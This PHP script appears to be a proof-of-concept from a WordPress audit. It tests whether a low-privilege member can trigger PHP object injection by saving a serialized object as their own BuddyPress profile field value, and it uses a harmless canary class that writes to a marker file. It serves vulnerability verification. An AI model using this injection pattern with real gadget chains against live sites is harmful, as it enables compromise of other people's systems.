<?php
error_reporting(E_ERROR|E_PARSE);
function out($k,$v){ echo $k.': '.$v."\n"; }
$MARK='/home/user/wpaudit/BP_POI_PROOF.txt';
@unlink($MARK);
// Canary "gadget" class: stands in for any class with a magic method that an
// installed plugin/theme could provide.
class BP_POI_Canary {
    public $payload = '';
    public function __wakeup(){ file_put_contents('/home/user/wpaudit/BP_POI_PROOF.txt', "WAKEUP fired, payload=".$this->payload."\n", FILE_APPEND); }
    public function __destruct(){ file_put_contents('/home/user/wpaudit/BP_POI_PROOF.txt', "DESTRUCT fired, payload=".$this->payload."\n", FILE_APPEND); }
}
out('xprofile_active', function_exists('xprofile_set_field_data')?'yes':'NO');
// Create a profile field group/field if needed.
if ( ! function_exists('xprofile_insert_field') ) { out('err','xprofile fns missing'); exit; }
$gid = xprofile_insert_field_group(array('name'=>'POI Test'));
$fid = xprofile_insert_field(array('field_group_id'=>$gid,'name'=>'poitest','type'=>'textbox','can_delete'=>true));
out('field_id', var_export($fid,true));

// Low-priv member edits THEIR OWN profile field.
$sub = get_user_by('login','subscriber');
if(!$sub){ $sub = get_user_by('login','author'); }
wp_set_current_user($sub->ID);
out('acting_as', $sub->user_login.' (caps: '.implode(',',array_keys(array_filter($sub->allcaps))).')');

// The payload a member submits as their profile field value.
$payload = 'O:14:"BP_POI_Canary":1:{s:7:"payload";s:11:"pwned-by-me";}';
$ok = xprofile_set_field_data($fid, $sub->ID, $payload);
out('set_field_data_ok', var_export($ok,true));
clearstatcache();
out('AFTER_SAVE_marker', file_exists($MARK)?('*** '.trim(file_get_contents($MARK)).' ***'):'no');

// Now the DISPLAY path.
$stored = BP_XProfile_ProfileData::get_value_byid($fid, $sub->ID);
out('stored_value', is_string($stored)?$stored:gettype($stored));
$disp = bp_unserialize_profile_field($stored);
clearstatcache();
out('AFTER_DISPLAY_marker', file_exists($MARK)?('*** '.trim(str_replace("\n"," | ",file_get_contents($MARK))).' ***'):'no');
